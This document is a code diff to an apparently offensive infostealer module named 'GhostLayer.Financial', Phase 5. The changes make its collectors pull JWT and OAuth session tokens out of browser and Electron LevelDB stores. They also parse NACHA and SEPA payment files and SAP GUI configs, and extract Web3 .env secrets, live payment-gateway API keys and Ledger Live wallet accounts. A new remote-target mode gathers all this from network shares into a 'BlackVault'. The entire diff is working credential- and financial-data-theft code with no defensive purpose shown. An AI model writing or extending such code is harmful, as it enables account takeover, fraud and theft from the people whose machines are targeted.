@@ -46,6 +46,15 @@ import time
 from pathlib import Path
 from typing import Any, Dict, List, Optional
 
+from ghost_layer_parsers import (
+    parse_nacha_ach,
+    parse_sepa_iso20022,
+    extract_strings_from_leveldb,
+    parse_web3_env_file,
+    parse_sap_gui_config,
+    parse_ledger_live_descriptors,
+)
+
 logger = logging.getLogger("GhostLayer.Financial")
 
 # ── cross-platform home
@@ -76,35 +85,50 @@ FINTECH_ORIGIN_KEYWORDS = [
 ]
 
 
-def _collect_browser_web_storage() -> List[Dict[str, Any]]:
+def _collect_browser_web_storage(custom_roots: Optional[List[Path]] = None) -> List[Dict[str, Any]]:
     """
-    P5-A — Enumerate Chrome-family IndexedDB and LocalStorage LevelDB folders.
-    Returns paths and origin hints; actual decryption happens inside the vault
-    ingest pipeline after DPAPI-unwrapped key is available.
+    P5-A — Enumerate Chrome-family IndexedDB and LocalStorage LevelDB folders,
+    and extract security tokens (JWTs, OAuth tokens) directly from readable LevelDB blocks.
     """
     findings: List[Dict[str, Any]] = []
-    for root in BROWSER_PROFILE_ROOTS:
+    roots = custom_roots or BROWSER_PROFILE_ROOTS
+    for root in roots:
         if not root.is_dir():
             continue
         # Walk profiles: Default, Profile 1, Profile 2, ...
-        for profile in [root / "Default"] + list(root.glob("Profile *")):
+        profiles = [root / "Default"] + list(root.glob("Profile *"))
+        for profile in profiles:
             for storage_type in ("IndexedDB", "Local Storage"):
                 storage_dir = profile / storage_type
                 if not storage_dir.is_dir():
                     continue
-                for item in storage_dir.iterdir():
-                    origin_hint = item.name.lower()
-                    is_fintech = any(kw in origin_hint for kw in FINTECH_ORIGIN_KEYWORDS)
-                    findings.append({
-                        "source": f"Browser Web Storage ({storage_type})",
-                        "path": str(item),
-                        "browser": root.parts[-3] if len(root.parts) >= 3 else "unknown",
-                        "profile": profile.name,
-                        "origin_hint": item.name,
-                        "fintech_flag": is_fintech,
-                        "severity": "critical" if is_fintech else "high",
-                        "artifact_type": "browser_web_storage",
-                    })
+                try:
+                    for item in storage_dir.iterdir():
+                        origin_hint = item.name.lower()
+                        is_fintech = any(kw in origin_hint for kw in FINTECH_ORIGIN_KEYWORDS)
+                        
+                        # Deep inspect .ldb / .log files if present
+                        extracted_tokens: Dict[str, List[str]] = {}
+                        if item.is_dir():
+                            for ldb_file in list(item.glob("*.ldb"))[:5] + list(item.glob("*.log"))[:2]:
+                                tokens = extract_strings_from_leveldb(ldb_file)
+                                for k, v in tokens.items():
+                                    if v:
+                                        extracted_tokens.setdefault(k, []).extend(v)
+
+                        findings.append({
+                            "source": f"Browser Web Storage ({storage_type})",
+                            "path": str(item),
+                            "browser": root.parts[-3] if len(root.parts) >= 3 else "unknown",
+                            "profile": profile.name,
+                            "origin_hint": item.name,
+                            "fintech_flag": is_fintech,
+                            "severity": "critical" if is_fintech else "high",
+                            "artifact_type": "browser_web_storage",
+                            "extracted_tokens": extracted_tokens,
+                        })
+                except Exception as exc:
+                    logger.debug("[P5-A] Error scanning %s: %s", storage_dir, exc)
     return findings
 
 
@@ -134,16 +158,25 @@ _ELECTRON_SESSION_PATTERNS = [
 ]
 
 
-def _collect_electron_sessions() -> List[Dict[str, Any]]:
-    """P5-B — Enumerate Electron app session/token storage LevelDB databases."""
+def _collect_electron_sessions(custom_apps: Optional[Dict[str, Path]] = None) -> List[Dict[str, Any]]:
+    """P5-B — Enumerate Electron app session/token storage LevelDB databases and extract tokens."""
     findings: List[Dict[str, Any]] = []
-    for app_name, app_root in ELECTRON_APPS.items():
+    apps = custom_apps or ELECTRON_APPS
+    for app_name, app_root in apps.items():
         if not app_root.is_dir():
             continue
         try:
             for pattern in _ELECTRON_SESSION_PATTERNS:
                 matches = list(app_root.glob(pattern))
                 if matches:
+                    extracted_tokens: Dict[str, List[str]] = {}
+                    for match_file in matches[:5]:
+                        if match_file.is_file():
+                            tokens = extract_strings_from_leveldb(match_file)
+                            for k, v in tokens.items():
+                                if v:
+                                    extracted_tokens.setdefault(k, []).extend(v)
+
                     findings.append({
                         "source": f"Electron Session ({app_name})",
                         "app": app_name,
@@ -151,6 +184,7 @@ def _collect_electron_sessions() -> List[Dict[str, Any]]:
                         "count": len(matches),
                         "severity": "critical",
                         "artifact_type": "electron_session_token",
+                        "extracted_tokens": extracted_tokens,
                     })
                     break  # one entry per app is enough for the index
         except Exception as exc:
@@ -244,12 +278,13 @@ _SAP_PATHS = [
 _SAGE_EXTENSIONS = {".ptb", ".sdb", ".saj"}
 
 
-def _collect_erp_artifacts() -> List[Dict[str, Any]]:
+def _collect_erp_artifacts(custom_roots: Optional[List[Path]] = None) -> List[Dict[str, Any]]:
     """P5-D — QuickBooks company files, SAP GUI connection profiles, Sage data files."""
     findings: List[Dict[str, Any]] = []
 
+    qb_roots = custom_roots or _QUICKBOOKS_ROOTS
     # QuickBooks
-    for root in _QUICKBOOKS_ROOTS:
+    for root in qb_roots:
         if not root.is_dir():
             continue
         try:
@@ -269,11 +304,19 @@ def _collect_erp_artifacts() -> List[Dict[str, Any]]:
     # SAP GUI
     for sap_path in _SAP_PATHS:
         if sap_path.is_file():
+            parsed_servers = []
+            try:
+                content = sap_path.read_text(encoding="utf-8", errors="ignore")
+                parsed_servers = parse_sap_gui_config(content)
+            except Exception:
+                pass
+
             findings.append({
                 "source": "SAP GUI Connection Profile",
                 "file": str(sap_path),
                 "severity": "critical",
                 "artifact_type": "erp_accounting_config",
+                "parsed_systems": parsed_servers,
             })
 
     # Sage / Peachtree — walk home/documents for known extensions
@@ -315,11 +358,12 @@ _BANKING_SEARCH_ROOTS = [
 ]
 
 
-def _collect_banking_files() -> List[Dict[str, Any]]:
-    """P5-E — Discover NACHA ACH, SWIFT MT940/MT101, SEPA ISO20022 payment files."""
+def _collect_banking_files(custom_roots: Optional[List[Path]] = None) -> List[Dict[str, Any]]:
+    """P5-E — Discover NACHA ACH, SWIFT MT940/MT101, SEPA ISO20022 payment files and parse content."""
     findings: List[Dict[str, Any]] = []
     seen: set = set()
-    for root in _BANKING_SEARCH_ROOTS:
+    roots = custom_roots or _BANKING_SEARCH_ROOTS
+    for root in roots:
         if not root.is_dir():
             continue
         try:
@@ -340,12 +384,25 @@ def _collect_banking_files() -> List[Dict[str, Any]]:
                             pass
                     if is_banking and str(fp) not in seen:
                         seen.add(str(fp))
+
+                        # Parse content based on type
+                        parsed_data: Dict[str, Any] = {}
+                        try:
+                            file_text = fp.read_text(encoding="utf-8", errors="ignore")
+                            if ext in (".ach", ".nacha") or "ach" in fn_lower:
+                                parsed_data = parse_nacha_ach(file_text)
+                            elif ext in (".xml", ".pain") or "<Document" in file_text:
+                                parsed_data = parse_sepa_iso20022(file_text)
+                        except Exception as parse_exc:
+                            logger.debug("Failed parsing banking file %s: %s", fp, parse_exc)
+
                         findings.append({
                             "source": "Banking Batch / Payment File",
                             "file": str(fp),
                             "extension": ext,
                             "severity": "critical",
                             "artifact_type": "banking_batch_file",
+                            "parsed_batch": parsed_data,
                         })
                 # Depth cap
                 if dirpath.count(os.sep) - str(root).count(os.sep) >= 5:
@@ -372,7 +429,7 @@ _HARDHAT_ACCOUNTS_PATTERN = re.compile(r'private(?:Key|Keys)?\s*[:=]\s*["\']?(0x
 _ENV_FILE_SEARCH_ROOTS = [HOME / "repos", HOME / "projects", HOME / "code", HOME / "dev", HOME / "Documents"]
 
 
-def _collect_web3_developer_secrets() -> List[Dict[str, Any]]:
+def _collect_web3_developer_secrets(custom_roots: Optional[List[Path]] = None) -> List[Dict[str, Any]]:
     """P5-F — .env API keys, Foundry/Hardhat keystores, Solana CLI keypairs."""
     findings: List[Dict[str, Any]] = []
 
@@ -397,7 +454,8 @@ def _collect_web3_developer_secrets() -> List[Dict[str, Any]]:
             })
 
     # .env files in dev repos
-    for repo_root in _ENV_FILE_SEARCH_ROOTS:
+    roots = custom_roots or _ENV_FILE_SEARCH_ROOTS
+    for repo_root in roots:
         if not repo_root.is_dir():
             continue
         try:
@@ -410,12 +468,14 @@ def _collect_web3_developer_secrets() -> List[Dict[str, Any]]:
                         try:
                             content = fp.read_text(encoding="utf-8", errors="ignore")
                             if _WEB3_ENV_PATTERNS.search(content):
+                                parsed_keys = parse_web3_env_file(content)
                                 findings.append({
                                     "source": "Web3 .env Developer Secret",
                                     "file": str(fp),
                                     "severity": "critical",
                                     "artifact_type": "web3_developer_secret",
                                     "matched_patterns": _WEB3_ENV_PATTERNS.findall(content),
+                                    "extracted_keys": parsed_keys,
                                 })
                         except Exception:
                             pass
@@ -460,10 +520,11 @@ _SOURCE_EXTENSIONS = {".py", ".js", ".ts", ".env", ".json", ".yaml", ".yml", ".t
 _SOURCE_SEARCH_ROOTS = [HOME / "repos", HOME / "projects", HOME / "code", HOME / "dev", HOME / "Documents"]
 
 
-def _collect_payment_gateway_keys() -> List[Dict[str, Any]]:
+def _collect_payment_gateway_keys(custom_roots: Optional[List[Path]] = None) -> List[Dict[str, Any]]:
     """P5-G — Scan source / config files for live payment gateway API keys."""
     findings: List[Dict[str, Any]] = []
-    for repo_root in _SOURCE_SEARCH_ROOTS:
+    roots = custom_roots or _SOURCE_SEARCH_ROOTS
+    for repo_root in roots:
         if not repo_root.is_dir():
             continue
         try:
@@ -476,13 +537,16 @@ def _collect_payment_gateway_keys() -> List[Dict[str, Any]]:
                     try:
                         content = fp.read_text(encoding="utf-8", errors="ignore")
                         for key_type, pat in _PAYMENT_KEY_PATTERNS.items():
-                            if pat.search(content):
+                            match = pat.search(content)
+                            if match:
+                                extracted_val = match.group(0) if match.groups() == () else match.group(1)
                                 findings.append({
                                     "source": f"Payment Gateway Key ({key_type})",
                                     "file": str(fp),
                                     "key_type": key_type,
                                     "severity": "critical",
                                     "artifact_type": "payment_gateway_key",
+                                    "extracted_key": extracted_val,
                                 })
                                 break  # one hit per file is enough
                     except Exception:
@@ -530,18 +594,28 @@ _HW_WALLET_PATHS: Dict[str, List[Path]] = {
 }
 
 
-def _collect_hw_wallet_artifacts() -> List[Dict[str, Any]]:
-    """P5-H — Enumerate Ledger Live, Trezor, Bitcoin-Core, Electrum, Exodus desktop portfolios."""
+def _collect_hw_wallet_artifacts(custom_wallet_paths: Optional[Dict[str, List[Path]]] = None) -> List[Dict[str, Any]]:
+    """P5-H — Enumerate Ledger Live, Trezor, Bitcoin-Core, Electrum, Exodus desktop portfolios and parse descriptors."""
     findings: List[Dict[str, Any]] = []
-    for wallet_name, paths in _HW_WALLET_PATHS.items():
+    wallet_paths = custom_wallet_paths or _HW_WALLET_PATHS
+    for wallet_name, paths in wallet_paths.items():
         for path in paths:
             if path.is_file():
+                parsed_accounts: List[Dict[str, Any]] = []
+                if wallet_name == "ledger_live":
+                    try:
+                        content = path.read_text(encoding="utf-8", errors="ignore")
+                        parsed_accounts = parse_ledger_live_descriptors(content)
+                    except Exception:
+                        pass
+
                 findings.append({
                     "source": f"Desktop Wallet ({wallet_name})",
                     "file": str(path),
                     "severity": "critical",
                     "artifact_type": "wallet_seed",
                     "note": f"{wallet_name} — may expose xpubs, account labels, full portfolio balance",
+                    "parsed_accounts": parsed_accounts,
                 })
             elif path.is_dir():
                 try:
@@ -615,18 +689,39 @@ def _collect_financial_documents() -> List[Dict[str, Any]]:
 # DISPATCHER: run_phase5_financial()
 # ═══════════════════════════════════════════════════════════════════════════════
 
-def run_phase5_financial(vault=None, agent_id: str = "ghost_financial") -> Dict[str, Any]:
+def run_phase5_financial(vault=None, agent_id: str = "ghost_financial", remote_ctx: Any = None) -> Dict[str, Any]:
     """
-    Orchestrate all Phase 5 financial collectors.  Optionally stores each
-    batch into BlackVault with appropriate target metadata for TargetIdentity
-    automatic ingestion.
+    Orchestrate all Phase 5 financial collectors. Supports optional remote_ctx
+    (instance of RemoteTargetContext) to collect from remote target shares.
+    Optionally stores each batch into BlackVault with appropriate target metadata
+    for TargetIdentity automatic ingestion.
     """
-    hostname = __import__("socket").gethostname()
-    target_id = f"local:{hostname}"
+    if remote_ctx is not None:
+        hostname = remote_ctx.host
+        target_id = remote_ctx.target_id or f"remote:{hostname}"
+        roots = remote_ctx.get_search_roots()
+        browser_roots = roots.get("browser_roots")
+        wam_roots = roots.get("wam_roots")
+        erp_roots = roots.get("erp_roots")
+        banking_roots = roots.get("banking_roots")
+        source_roots = roots.get("source_roots")
+        privilege_level = getattr(remote_ctx, "privilege_level", "admin")
+        domain_role = getattr(remote_ctx, "domain_role", "workstation")
+    else:
+        hostname = __import__("socket").gethostname()
+        target_id = f"local:{hostname}"
+        browser_roots = None
+        wam_roots = None
+        erp_roots = None
+        banking_roots = None
+        source_roots = None
+        privilege_level = "user"
+        domain_role = "workstation"
 
     phase5: Dict[str, Any] = {
         "timestamp": time.time(),
         "hostname": hostname,
+        "target_id": target_id,
         "phase": "5_financial",
         "browser_web_storage": [],
         "electron_sessions": [],
@@ -641,13 +736,13 @@ def run_phase5_financial(vault=None, agent_id: str = "ghost_financial") -> Dict[
     }
 
     collectors = [
-        ("browser_web_storage", _collect_browser_web_storage, "browser_web_storage"),
+        ("browser_web_storage", lambda: _collect_browser_web_storage(browser_roots), "browser_web_storage"),
         ("electron_sessions",   _collect_electron_sessions,   "electron_session_token"),
         ("azure_prt",          _collect_azure_prt,           "azure_prt_cache"),
-        ("erp_artifacts",      _collect_erp_artifacts,       "erp_accounting_config"),
-        ("banking_files",      _collect_banking_files,       "banking_batch_file"),
-        ("web3_secrets",       _collect_web3_developer_secrets, "web3_developer_secret"),
-        ("payment_gateway_keys", _collect_payment_gateway_keys, "payment_gateway_key"),
+        ("erp_artifacts",      lambda: _collect_erp_artifacts(erp_roots),       "erp_accounting_config"),
+        ("banking_files",      lambda: _collect_banking_files(banking_roots),   "banking_batch_file"),
+        ("web3_secrets",       lambda: _collect_web3_developer_secrets(source_roots), "web3_developer_secret"),
+        ("payment_gateway_keys", lambda: _collect_payment_gateway_keys(source_roots), "payment_gateway_key"),
         ("hw_wallets",         _collect_hw_wallet_artifacts, "wallet_seed"),
         ("financial_documents", _collect_financial_documents, "financial_document"),
     ]
@@ -671,8 +766,8 @@ def run_phase5_financial(vault=None, agent_id: str = "ghost_financial") -> Dict[
                             target_id=target_id,
                             artifact_name=item_name,
                             metadata={**meta, **{
-                                "privilege_level": "user",
-                                "domain_role": "workstation",
+                                "privilege_level": privilege_level,
+                                "domain_role": domain_role,
                             }},
                             agent_id=agent_id,
                         )
